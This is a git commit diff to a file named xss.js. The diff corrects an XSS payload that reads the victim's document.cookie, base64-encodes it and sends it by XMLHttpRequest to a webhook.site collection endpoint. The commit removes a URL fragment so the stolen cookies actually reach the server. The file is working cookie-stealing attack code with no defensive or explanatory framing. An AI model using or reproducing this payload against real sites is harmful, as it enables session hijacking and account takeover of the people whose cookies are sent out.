be67e9b85ce8cc7a8f5da31b0a59b35a68969c80
khoabda305 <39853984+matuhn@users.noreply.github.com>
2020-10-21 17:10:48 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -4,5 +4,5 @@ xhttp.onreadystatechange = function() {
     	console.log("Cookie gone")
     }
 };
-xhttp.open("GET", "https://webhook.site/#!/87da7389-f0dc-496e-a606-b1accbc5630c/?a=" + btoa(document.cookie), true);
+xhttp.open("GET", "https://webhook.site/87da7389-f0dc-496e-a606-b1accbc5630c/?a=" + btoa(document.cookie), true);
 xhttp.send();
